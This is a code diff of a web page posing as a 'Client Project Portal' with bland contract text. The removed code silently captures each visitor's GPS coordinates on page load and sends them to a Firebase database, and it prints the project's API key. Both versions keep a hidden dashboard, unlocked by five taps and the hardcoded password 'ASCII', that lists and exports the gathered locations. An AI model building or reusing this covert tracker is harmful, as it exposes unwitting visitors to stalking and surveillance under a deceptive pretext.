@@ -4,117 +4,117 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Client Project Portal</title>
   <style>
-    :root {
-      --main-bg: #f4f6f9;
-      --primary: #3a3f51;
-      --accent: #e74c3c;
-      --shadow: rgba(0, 0, 0, 0.1);
-    }* {
-  box-sizing: border-box;
-  font-family: 'Segoe UI', sans-serif;
-}
-
-body {
-  margin: 0;
-  background: var(--main-bg);
-}
-
-.container {
-  padding: 2rem;
-  max-width: 1000px;
-  margin: auto;
-}
-
-.card {
-  background: white;
-  padding: 1.5rem;
-  border-radius: 10px;
-  box-shadow: 0 2px 10px var(--shadow);
-  margin-bottom: 2rem;
-  transition: all 0.3s ease-in-out;
-}
-
-.card:hover {
-  transform: scale(1.01);
-}
-
-.hidden {
-  display: none;
-}
-
-h1, h2 {
-  color: var(--primary);
-}
-
-table {
-  width: 100%;
-  border-collapse: collapse;
-  margin-top: 1rem;
-}
-
-table th, table td {
-  padding: 0.8rem;
-  text-align: left;
-  border-bottom: 1px solid #ddd;
-}
-
-input[type="text"] {
-  padding: 0.6rem;
-  width: 100%;
-  margin: 0.5rem 0 1rem;
-  border: 1px solid #ccc;
-  border-radius: 5px;
-}
-
-.export-btn {
-  background: var(--accent);
-  color: white;
-  padding: 0.6rem 1.2rem;
-  border: none;
-  border-radius: 5px;
-  cursor: pointer;
-  margin-bottom: 1rem;
-}
-
-.export-btn:hover {
-  background: #c0392b;
-}
-
-.note {
-  font-size: 0.9rem;
-  color: gray;
-}
-
-.fade-in {
-  animation: fadein 1s ease-in-out;
-}
-
-@keyframes fadein {
-  from { opacity: 0; transform: translateY(10px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+    }
+    body {
+      margin: 0;
+      background: #f4f4f4;
+      color: #333;
+      transition: background 0.5s ease;
+    }
+    header {
+      background: #fff;
+      padding: 2rem 1rem;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+    }
+    main {
+      padding: 2rem 1rem;
+      max-width: 700px;
+      margin: auto;
+    }
+    section {
+      margin-bottom: 2rem;
+    }
+    h2 {
+      margin-bottom: 0.5rem;
+    }
+    .hidden-admin {
+      display: none;
+    }
+    #adminPanel {
+      display: none;
+      background: white;
+      padding: 2rem 1rem;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      margin-top: 2rem;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 1rem;
+    }
+    th, td {
+      padding: 0.5rem;
+      border: 1px solid #ccc;
+      text-align: left;
+    }
+    .fade-in {
+      animation: fadeIn 0.8s ease-in-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .password-input {
+      display: flex;
+      gap: 10px;
+      margin: 1rem 0;
+    }
+    .password-input input {
+      flex: 1;
+      padding: 0.5rem;
+    }
+    .password-input button {
+      padding: 0.5rem 1rem;
+    }
+    .csv-button {
+      background: #1e88e5;
+      color: white;
+      border: none;
+      padding: 0.5rem 1rem;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 1rem 0;
+    }
   </style>
 </head>
 <body>
-  <div class="container">
-    <div id="contract" class="card fade-in">
-      <h1>Client Project Portal</h1>
-      <p><strong>Client Requirements</strong></p>
-      <p>All specifications must be approved and timestamped.</p><p><strong>Terms and Review</strong></p>
-  <p>Final review will be automatically saved and verified upon access.</p>
-
-  <p><strong>Legal & Compliance</strong></p>
-  <p>Ensure full adherence to documentation agreements.</p>
-
-  <p class="note">Tap 5 times anywhere below and scroll to the bottom to access internal review...</p>
+  <header>
+    <h1>Client Project Portal</h1>
+  </header>
+  <main onclick="tapCount()">
+    <section>
+      <h2>Client Requirements</h2>
+      <p>All specifications must be approved and timestamped.</p>
+    </section>
+    <section>
+      <h2>Terms and Review</h2>
+      <p>Final review will be automatically saved and verified upon access.</p>
+    </section>
+    <section>
+      <h2>Legal & Compliance</h2>
+      <p>Ensure full adherence to documentation agreements.</p>
+    </section>
+    <p style="text-align:center;margin-top:3rem;font-style:italic;color:#888">Tap 5 times anywhere below and scroll to the bottom to access internal review...</p><div id="passwordPrompt" class="hidden-admin fade-in">
+  <div class="password-input">
+    <input type="password" id="adminPassword" placeholder="Enter admin password...">
+    <button onclick="unlockAdmin()">Enter</button>
+  </div>
 </div>
 
-<div id="admin" class="card hidden fade-in">
+<div id="adminPanel" class="fade-in">
   <h2>Admin Dashboard</h2>
-  <input id="search" type="text" placeholder="Search by device or location..." />
-  <button class="export-btn" onclick="exportCSV()">Export as CSV</button>
-  <p><strong>Daily logs:</strong> <span id="dailyCount">0</span></p>
+  <input type="text" id="searchInput" placeholder="Search by device or location...">
+  <button class="csv-button" onclick="exportCSV()">Export as CSV</button>
+  <p>Daily logs: <span id="dailyCount">0</span></p>
   <table>
     <thead>
       <tr>
@@ -126,121 +126,75 @@ input[type="text"] {
     </thead>
     <tbody id="logTable"></tbody>
   </table>
-  <p class="note">This page is protected by a secure contract interface.</p>
 </div>
 
-  </div>  <script type="module">
-    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js';
-    import { getDatabase, ref, push, onValue } from 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js';
+  </main>  <script>
+    const dbUrl = "https://gps-d0bab-default-rtdb.firebaseio.com/locations.json";
+    let tapCounter = 0;
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
+    function tapCount() {
+      tapCounter++;
+      if (tapCounter >= 5) {
+        document.getElementById("passwordPrompt").style.display = "block";
+      }
+    }
 
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-    const logsRef = ref(db, 'logs');
+    function unlockAdmin() {
+      const input = document.getElementById("adminPassword").value;
+      if (input.trim().toUpperCase() === "ASCII") {
+        document.getElementById("adminPanel").style.display = "block";
+        loadData();
+      } else {
+        alert("Incorrect password");
+      }
+    }
 
-    function logLocation() {
-      if (!navigator.geolocation) return;
-      navigator.geolocation.getCurrentPosition(pos => {
-        push(logsRef, {
-          device: deviceID(),
-          lat: pos.coords.latitude,
-          lng: pos.coords.longitude,
-          timestamp: new Date().toISOString()
+    async function loadData() {
+      try {
+        const res = await fetch(dbUrl);
+        const data = await res.json();
+        const logs = Object.values(data || {});
+        const logTable = document.getElementById("logTable");
+        let today = new Date().toDateString();
+        let dailyCount = 0;
+
+        logs.reverse().forEach(entry => {
+          const { device = "Unknown", latitude, longitude, timestamp } = entry;
+          if (!timestamp) return;
+          const dateStr = new Date(timestamp).toLocaleString();
+
+          if (new Date(timestamp).toDateString() === today) dailyCount++;
+
+          const row = `<tr>
+            <td>${device}</td>
+            <td>${latitude ?? "-"}</td>
+            <td>${longitude ?? "-"}</td>
+            <td>${dateStr}</td>
+          </tr>`;
+          logTable.innerHTML += row;
         });
-      });
-    }
 
-    function deviceID() {
-      let id = localStorage.getItem("device_id");
-      if (!id) {
-        id = Math.random().toString(36).slice(2);
-        localStorage.setItem("device_id", id);
+        document.getElementById("dailyCount").innerText = dailyCount;
+      } catch (e) {
+        console.error("Failed to fetch logs:", e);
       }
-      return id;
     }
-
-    function updateTable(data) {
-      const tbody = document.getElementById('logTable');
-      const search = document.getElementById('search').value.toLowerCase();
-      tbody.innerHTML = '';
-      let dailyCount = 0;
-
-      for (const key in data) {
-        const entry = data[key];
-        const date = new Date(entry.timestamp);
-        const today = new Date();
-        const isToday = date.toDateString() === today.toDateString();
-
-        if (isToday) dailyCount++;
-
-        const rowText = `${entry.device} ${entry.lat} ${entry.lng} ${entry.timestamp}`.toLowerCase();
-        if (!rowText.includes(search)) continue;
-
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td>${entry.device}</td>
-          <td>${entry.lat}</td>
-          <td>${entry.lng}</td>
-          <td>${new Date(entry.timestamp).toLocaleString()}</td>
-        `;
-        tbody.appendChild(tr);
-      }
-
-      document.getElementById('dailyCount').innerText = dailyCount;
-    }
-
-    onValue(logsRef, snap => {
-      const data = snap.val() || {};
-      updateTable(data);
-    });
-
-    document.getElementById('search').addEventListener('input', () => {
-      onValue(logsRef, snap => {
-        const data = snap.val() || {};
-        updateTable(data);
-      });
-    });
 
     function exportCSV() {
-      let csv = 'Device,Latitude,Longitude,Timestamp\n';
-      document.querySelectorAll('#logTable tr').forEach(row => {
-        const cols = row.querySelectorAll('td');
-        const rowText = Array.from(cols).map(td => td.innerText).join(',');
-        csv += rowText + '\n';
+      let csv = "Device,Latitude,Longitude,Timestamp\n";
+      document.querySelectorAll("#logTable tr").forEach(row => {
+        const cols = row.querySelectorAll("td");
+        const line = Array.from(cols).map(td => td.innerText).join(",");
+        csv += line + "\n";
       });
-      const blob = new Blob([csv], { type: 'text/csv' });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = 'location_logs.csv';
-      a.click();
+
+      const blob = new Blob([csv], { type: "text/csv" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = "gps_logs.csv";
+      link.click();
+      URL.revokeObjectURL(url);
     }
-
-    // Tap + scroll unlock for admin panel
-    let tapCount = 0;
-    document.getElementById('contract').addEventListener('click', () => {
-      tapCount++;
-      if (tapCount >= 5) {
-        setTimeout(() => {
-          if (window.scrollY + window.innerHeight >= document.body.scrollHeight) {
-            const pass = prompt('Enter access password');
-            if (pass === 'ASCII') {
-              document.getElementById('admin').classList.remove('hidden');
-              window.scrollTo(0, 0);
-            }
-          }
-        }, 500);
-      }
-    });
-
-    logLocation();
   </script></body>
-  </html>
+</html>
